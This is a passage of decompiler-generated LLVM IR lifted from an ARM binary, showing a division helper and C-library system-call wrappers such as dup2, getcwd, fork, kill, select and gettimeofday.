  %. = zext i1 %v9_1254c to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_125ec:                               ; preds = %dec_label_pc_12554
  %v2_125ec = icmp ugt i32 %v1_1254c, 65535
  br i1 %v2_125ec, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_125ec
  %v2_125f0 = and i32 %v1_1254c, 32768
  %v3_125f0 = icmp eq i32 %v2_125f0, 0
  %v4_125f0 = udiv i32 %v1_1254c, 65536
  br i1 %v3_125f0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_125ec
  %v0_125fc65 = phi i32 [ %v1_1254c, %dec_label_pc_125ec ], [ %v4_125f0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12600 = phi i32 [ %v0_125fc65, %.thread16 ], [ %v4_125f0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_125fc = icmp ugt i32 %v1_12600, 255
  br i1 %v2_125fc, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12600 = and i32 %v1_12600, 128
  %v3_12600 = icmp eq i32 %v2_12600, 0
  %v4_12600 = udiv i32 %v1_12600, 256
  br i1 %v3_12600, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12604 = or i32 %storemerge, 8
  store i32 %v2_12604, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12610 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12604, %bb98 ]
  %v1_1260c = phi i32 [ %v1_12600, %bb96 ], [ %v4_12600, %bb97 ], [ %v4_12600, %bb98 ]
  %v2_12608 = icmp ugt i32 %v1_1260c, 15
  br i1 %v2_12608, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_1260c = and i32 %v1_1260c, 8
  %v3_1260c = icmp eq i32 %v2_1260c, 0
  %v4_1260c = udiv i32 %v1_1260c, 16
  br i1 %v3_1260c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12610 = add nsw i32 %v1_12610, 4
  store i32 %v2_12610, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12618 = phi i32 [ %v1_12610, %.thread17 ], [ %v1_12610, %bb99 ], [ %v2_12610, %bb100 ]
  %v5_1261c = phi i32 [ %v1_1260c, %.thread17 ], [ %v4_1260c, %bb99 ], [ %v4_1260c, %bb100 ]
  %v2_12614 = icmp ugt i32 %v5_1261c, 3
  %v7_12614 = icmp eq i32 %v5_1261c, 4
  %v2_12618 = xor i1 %v7_12614, true
  %v3_12618 = and i1 %v2_12614, %v2_12618
  br i1 %v3_12618, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12618 = add nsw i32 %v4_12618, 3
  store i32 %v5_12618, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_1261c = phi i32 [ %v4_12618, %.thread18 ], [ %v5_12618, %bb101 ]
  %v2_1261c = xor i1 %v2_12614, true
  %v3_1261c = or i1 %v7_12614, %v2_1261c
  br i1 %v3_1261c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_1261c = udiv i32 %v5_1261c, 2
  %v9_1261c = add i32 %v4_1261c, %v8_1261c
  store i32 %v9_1261c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12620 = phi i32 [ %v4_1261c, %bb102 ], [ %v9_1261c, %bb103 ]
  %v6_12620 = lshr i32 %v0_1254c, %v1_12620
  store i32 %v6_12620, i32* %r0.global-to-local, align 4
  ret i32 %v6_12620

dec_label_pc_12628:                               ; preds = %entry
  %v0_1262c = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1261c, { 1, 0 }
  uselistorder i1 %v7_12614, { 1, 0 }
  uselistorder i32 %v4_1260c, { 1, 0 }
  uselistorder i32 %v1_1260c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12604, { 1, 0 }
  uselistorder i32 %v4_12600, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12600, { 1, 0, 2, 3 }
  uselistorder i32 %v4_125f0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_125c8, { 1, 0 }
  uselistorder i32 %v0_125d8, { 1, 0, 2 }
  uselistorder i32 %v4_125bc, { 1, 0 }
  uselistorder i32 %v1_125c4, { 1, 2, 0 }
  uselistorder i32 %v4_125b0, { 1, 0 }
  uselistorder i32 %v1_125b8, { 1, 2, 0 }
  uselistorder i32 %v4_125a4, { 1, 0 }
  uselistorder i32 %v1_125ac, { 1, 2, 0 }
  uselistorder i32 %v1_125d0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_125a0, { 1, 0 }
  uselistorder i32 %v1_125cc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1258c, { 1, 0 }
  uselistorder i32 %v3_12588, { 1, 0 }
  uselistorder i32 %v1_12588, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1258c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12578, { 1, 0 }
  uselistorder i32 %v4_12574, { 2, 1, 0 }
  uselistorder i32 %v1_12578, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12580.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_1254c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_1254c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12540, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_125d8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12594, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12580thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12640 = udiv i32 %arg1, %arg2
  ret i32 %v2_12640
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_1265c = call i32 @__GI_raise(i32 8)
  ret i32 %v1_1265c
}

define i32 @function_12668(i32 %arg1) local_unnamed_addr {
dec_label_pc_12668:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_12670 = load i32, i32* @r7, align 4
  store i32 %v0_12670, i32* @ip, align 4
  %v0_12680 = load i32, i32* @r0, align 4
  %v2_12680 = icmp ugt i32 %v0_12680, -4097
  br i1 %v2_12680, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_12680

bb1:                                              ; preds = %entry
  %v4_1268c = icmp eq i32 %v0_12680, -38
  br i1 %v4_1268c, label %dec_label_pc_12694, label %bb2

dec_label_pc_12694:                               ; preds = %bb1
  store i32 %v0_12670, i32* @ip, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12694, %bb1
  %v0_126ac = call i32 @__syscall_error()
  ret i32 %v0_126ac
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_126b0 = load i32, i32* @r7, align 4
  store i32 %v3_126b0, i32* %stack_var_-8, align 4
  %v0_126bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_126bc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_126bc, -4095
  br i1 %tmp, label %dec_label_pc_126dc, label %dec_label_pc_126cc

dec_label_pc_126cc:                               ; preds = %entry
  %v0_126cc = call i32 @__GI___errno_location()
  %v0_126d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_126d0 = sub i32 0, %v0_126d0
  %v2_126d4 = inttoptr i32 %v0_126cc to i32*
  store i32 %v1_126d0, i32* %v2_126d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_126dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %entry, %dec_label_pc_126cc
  %v1_126e0 = phi i32 [ %v0_126bc, %entry ], [ -1, %dec_label_pc_126cc ]
  %v2_126dc = phi i32 [ %v3_126b0, %entry ], [ %v2_126dc.pre, %dec_label_pc_126cc ]
  store i32 %v2_126dc, i32* @r7, align 4
  ret i32 %v1_126e0

; uselistorder directives
  uselistorder i32 %v0_126bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126dc, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_126e4 = load i32, i32* @r2, align 4
  %v9_126e4 = load i32, i32* @r3, align 4
  store i32 %v9_126e4, i32* %stack_var_-4, align 4
  %v1_126f4 = and i32 %arg2, 64
  %v2_126f4 = icmp eq i32 %v1_126f4, 0
  br i1 %v2_126f4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_126fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_126fc, i32* @r3, align 4
  %phitmp = urem i32 %v6_126e4, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_12700 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_12700, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12730, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %.thread
  %v0_12720 = call i32 @__GI___errno_location()
  %v0_12724 = load i32, i32* %r7.global-to-local, align 4
  %v1_12724 = sub i32 0, %v0_12724
  store i32 %v1_12724, i32* @r3, align 4
  %v2_12728 = inttoptr i32 %v0_12720 to i32*
  store i32 %v1_12724, i32* %v2_12728, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %.thread, %dec_label_pc_12720
  %v0_12730 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_12720 ]
  ret i32 %v0_12730

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12730, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12744 = load i32, i32* @r7, align 4
  store i32 %v3_12744, i32* %stack_var_-8, align 4
  %v0_12750 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12750, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12750, -4095
  br i1 %tmp, label %dec_label_pc_12770, label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %entry
  %v0_12760 = call i32 @__GI___errno_location()
  %v0_12764 = load i32, i32* %r7.global-to-local, align 4
  %v1_12764 = sub i32 0, %v0_12764
  %v2_12768 = inttoptr i32 %v0_12760 to i32*
  store i32 %v1_12764, i32* %v2_12768, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12770.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %entry, %dec_label_pc_12760
  %v1_12774 = phi i32 [ %v0_12750, %entry ], [ -1, %dec_label_pc_12760 ]
  %v2_12770 = phi i32 [ %v3_12744, %entry ], [ %v2_12770.pre, %dec_label_pc_12760 ]
  store i32 %v2_12770, i32* @r7, align 4
  ret i32 %v1_12774

; uselistorder directives
  uselistorder i32 %v0_12750, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12770, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_12778 = load i32, i32* @r4, align 4
  %v6_12778 = load i32, i32* @r5, align 4
  %v9_12778 = load i32, i32* @r6, align 4
  %v12_12778 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_1277c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_1278c = icmp eq i32 %arg1, 0
  br i1 %v2_1277c, label %dec_label_pc_1278c, label %dec_label_pc_127bc

dec_label_pc_1278c:                               ; preds = %entry
  br i1 %v2_1278c, label %dec_label_pc_127a8, label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_1278c
  %v0_12794 = call i32 @__GI___errno_location()
  %v0_12798 = load i32, i32* @r6, align 4
  store i32 %v0_12798, i32* @r4, align 4
  %v2_127a0 = inttoptr i32 %v0_12794 to i32*
  store i32 22, i32* %v2_127a0, align 4
  br label %dec_label_pc_12854

dec_label_pc_127a8:                               ; preds = %dec_label_pc_1278c
  %v0_127a8 = call i32 @__GI_getpagesize()
  %v5_127b0 = icmp slt i32 %v0_127a8, 4096
  br i1 %v5_127b0, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_127a8
  store i32 %v0_127a8, i32* @r7, align 4
  br label %dec_label_pc_127cc

bb16:                                             ; preds = %dec_label_pc_127a8
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_127cc

dec_label_pc_127bc:                               ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_1278c, label %dec_label_pc_127cc, label %bb17

bb17:                                             ; preds = %dec_label_pc_127bc
  br label %dec_label_pc_127e0

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127bc, %bb, %bb16
  %v0_127cc = phi i32 [ %v0_127a8, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_127bc ]
  %v1_127d0 = call i32 @malloc(i32 %v0_127cc)
  %v2_127d4 = icmp eq i32 %v1_127d0, 0
  br i1 %v2_127d4, label %dec_label_pc_12850, label %dec_label_pc_127dc

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127cc
  br label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %bb17, %dec_label_pc_127dc
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_127d0, %dec_label_pc_127dc ]
  %v0_12824 = phi i32 [ %arg1, %bb17 ], [ %v1_127d0, %dec_label_pc_127dc ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_12824, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_12824, -4095
  br i1 %tmp, label %dec_label_pc_1280c, label %dec_label_pc_127fc

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127e0
  %v0_127fc = call i32 @__GI___errno_location()
  %v0_12800 = load i32, i32* @r7, align 4
  %v1_12800 = sub i32 0, %v0_12800
  %v2_12804 = inttoptr i32 %v0_127fc to i32*
  store i32 %v1_12800, i32* %v2_12804, align 4
  br label %dec_label_pc_1283c

dec_label_pc_1280c:                               ; preds = %dec_label_pc_127e0
  %v1_1280c = icmp slt i32 %v0_12824, 0
  br i1 %v1_1280c, label %dec_label_pc_1283c, label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_1280c
  %v0_12814 = load i32, i32* @r4, align 4
  %v2_12814 = icmp eq i32 %v0_12814, 0
  br i1 %v2_12814, label %bb18, label %dec_label_pc_12830.thread7

dec_label_pc_12830.thread7:                       ; preds = %dec_label_pc_12814
  br label %dec_label_pc_12854

bb18:                                             ; preds = %dec_label_pc_12814
  %v1_12818 = load i32, i32* @r6, align 4
  %v3_12818 = icmp eq i32 %v1_12818, 0
  br i1 %v3_12818, label %dec_label_pc_12830, label %dec_label_pc_12830.thread

dec_label_pc_12830.thread:                        ; preds = %bb18
  br label %bb19

dec_label_pc_12830:                               ; preds = %bb18
  %v2_12828 = inttoptr i32 %v0_12824 to i32*
  %v3_12828 = call i32 @realloc(i32* %v2_12828, i32 %v0_12824)
  store i32 %v3_12828, i32* @r4, align 4
  %v2_12830 = icmp eq i32 %v3_12828, 0
  br i1 %v2_12830, label %dec_label_pc_12830.bb19_crit_edge, label %dec_label_pc_12854

dec_label_pc_12830.bb19_crit_edge:                ; preds = %dec_label_pc_12830
  %v1_12834.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_12830.bb19_crit_edge, %dec_label_pc_12830.thread
  %v1_12834 = phi i32 [ %v1_12834.pre, %dec_label_pc_12830.bb19_crit_edge ], [ %v0_12824, %dec_label_pc_12830.thread ]
  store i32 %v1_12834, i32* @r4, align 4
  br label %dec_label_pc_12854

dec_label_pc_1283c:                               ; preds = %dec_label_pc_1280c, %dec_label_pc_127fc
  %v0_1283c = load i32, i32* @r4, align 4
  %v2_1283c = icmp eq i32 %v0_1283c, 0
  br i1 %v2_1283c, label %dec_label_pc_12844, label %dec_label_pc_12850

dec_label_pc_12844:                               ; preds = %dec_label_pc_1283c
  %v0_12844 = load i32, i32* @r5, align 4
  store i32 %v0_12844, i32* @r0, align 4
  %v0_12848 = call i32 @free()
  br label %dec_label_pc_12854

dec_label_pc_12850:                               ; preds = %dec_label_pc_1283c, %dec_label_pc_127cc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12830.thread7, %bb19, %dec_label_pc_12830, %dec_label_pc_12844, %dec_label_pc_12794, %dec_label_pc_12850
  %v0_12854 = load i32, i32* @r4, align 4
  store i32 %v3_12778, i32* @r4, align 4
  store i32 %v6_12778, i32* @r5, align 4
  store i32 %v9_12778, i32* @r6, align 4
  store i32 %v12_12778, i32* @r7, align 4
  ret i32 %v0_12854

; uselistorder directives
  uselistorder i32 %v0_12824, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_127d0, { 1, 0, 2 }
  uselistorder i32 %v0_127a8, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_12854, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_127e0, { 1, 0 }
  uselistorder label %dec_label_pc_127cc, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_12870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 96) to i32*), align 4
  %v1_12874 = inttoptr i32 %v4_12870 to i32*
  %v2_12874 = load i32, i32* %v1_12874, align 4
  %v2_12878 = icmp eq i32 %v2_12874, 0
  br i1 %v2_12878, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_12880 = phi i32 [ %v2_12874, %entry ], [ 4096, %bb ]
  ret i32 %v1_12880

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_1289c = load i32, i32* @r0, align 4
  ret i32 %v1_1289c
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_128a4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_128b4 = call i32 @gettimeofday(i32 %v2_128a4, i32 0)
  %v2_128b8 = load i32, i32* %stack_var_-16, align 4
  %v2_128bc = icmp eq i32* %arg1, null
  br i1 %v2_128bc, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_128b8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_128b8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12904, label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %entry
  %v0_128f4 = call i32 @__GI___errno_location()
  %v0_128f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_128f8 = sub i32 0, %v0_128f8
  %v2_128fc = inttoptr i32 %v0_128f4 to i32*
  store i32 %v1_128f8, i32* %v2_128fc, align 4
  br label %dec_label_pc_12904

dec_label_pc_12904:                               ; preds = %entry, %dec_label_pc_128f4
  %v1_1290c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_128f4 ]
  ret i32 %v1_1290c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12904, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12910 = load i32, i32* @r7, align 4
  store i32 %v3_12910, i32* %stack_var_-8, align 4
  %v0_1291c = load i32, i32* @r0, align 4
  store i32 %v0_1291c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1291c, -4095
  br i1 %tmp, label %dec_label_pc_1293c, label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %entry
  %v0_1292c = call i32 @__GI___errno_location()
  %v0_12930 = load i32, i32* %r7.global-to-local, align 4
  %v1_12930 = sub i32 0, %v0_12930
  %v2_12934 = inttoptr i32 %v0_1292c to i32*
  store i32 %v1_12930, i32* %v2_12934, align 4
  %v2_1293c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %entry, %dec_label_pc_1292c
  %v1_12940 = phi i32 [ %v0_1291c, %entry ], [ -1, %dec_label_pc_1292c ]
  %v2_1293c = phi i32 [ %v3_12910, %entry ], [ %v2_1293c.pre, %dec_label_pc_1292c ]
  store i32 %v2_1293c, i32* @r7, align 4
  ret i32 %v1_12940

; uselistorder directives
  uselistorder i32 %v0_1291c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1293c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12950 = load i32, i32* @r0, align 4
  %v1_12950 = load i32, i32* @r1, align 4
  %v2_12950 = call i32 @wait4(i32 %v0_12950, i32 %v1_12950)
  ret i32 %v2_12950
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12990, label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %entry
  %v0_12980 = call i32 @__GI___errno_location()
  %v0_12984 = load i32, i32* %r4.global-to-local, align 4
  %v1_12984 = sub i32 0, %v0_12984
  %v2_12988 = inttoptr i32 %v0_12980 to i32*
  store i32 %v1_12984, i32* %v2_12988, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_12990:                               ; preds = %entry, %dec_label_pc_12980
  %v0_12990 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12980 ]
  ret i32 %v0_12990

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12990, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_129a0 = load i32, i32* @r7, align 4
  store i32 %v3_129a0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_129c8, label %dec_label_pc_129b8

dec_label_pc_129b8:                               ; preds = %entry
  %v0_129b8 = call i32 @__GI___errno_location()
  %v0_129bc = load i32, i32* %r7.global-to-local, align 4
  %v1_129bc = sub i32 0, %v0_129bc
  %v2_129c0 = inttoptr i32 %v0_129b8 to i32*
  store i32 %v1_129bc, i32* %v2_129c0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_129cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %entry, %dec_label_pc_129b8
  %v2_129cc = phi i32 [ %v3_129a0, %entry ], [ %v2_129cc.pre, %dec_label_pc_129b8 ]
  %v0_129c8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_129b8 ]
  store i32 %v2_129cc, i32* @r7, align 4
  ret i32 %v0_129c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_129c8, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_129d4 = load i32, i32* @r7, align 4
  store i32 %v3_129d4, i32* %stack_var_-8, align 4
  %v0_129e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_129e0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_129e0, -4095
  br i1 %tmp, label %dec_label_pc_12a00, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %entry
  %v0_129f0 = call i32 @__GI___errno_location()
  %v0_129f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_129f4 = sub i32 0, %v0_129f4
  %v2_129f8 = inttoptr i32 %v0_129f0 to i32*
  store i32 %v1_129f4, i32* %v2_129f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12a00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %entry, %dec_label_pc_129f0
  %v1_12a04 = phi i32 [ %v0_129e0, %entry ], [ -1, %dec_label_pc_129f0 ]
  %v2_12a00 = phi i32 [ %v3_129d4, %entry ], [ %v2_12a00.pre, %dec_label_pc_129f0 ]
  store i32 %v2_12a00, i32* @r7, align 4
  ret i32 %v1_12a04

; uselistorder directives
  uselistorder i32 %v0_129e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12a00, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_12a0c = ptrtoint i32* %stack_var_-16 to i32
  %v2_12a18 = call i32 @getrlimit(i32 7, i32 %v2_12a0c)
  %v1_12a1c = icmp slt i32 %v2_12a18, 0
  %v5_12a20 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_12a1c, i32 256, i32 %v5_12a20
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a34 = load i32, i32* @r7, align 4
  store i32 %v3_12a34, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12a5c, label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %entry
  %v0_12a4c = call i32 @__GI___errno_location()
  %v0_12a50 = load i32, i32* %r7.global-to-local, align 4
  %v1_12a50 = sub i32 0, %v0_12a50
  %v2_12a54 = inttoptr i32 %v0_12a4c to i32*
  store i32 %v1_12a50, i32* %v2_12a54, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12a60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %entry, %dec_label_pc_12a4c
  %v2_12a60 = phi i32 [ %v3_12a34, %entry ], [ %v2_12a60.pre, %dec_label_pc_12a4c ]
  %v0_12a5c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12a4c ]
  store i32 %v2_12a60, i32* @r7, align 4
  ret i32 %v0_12a5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a5c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a68 = load i32, i32* @r7, align 4
  store i32 %v3_12a68, i32* %stack_var_-8, align 4
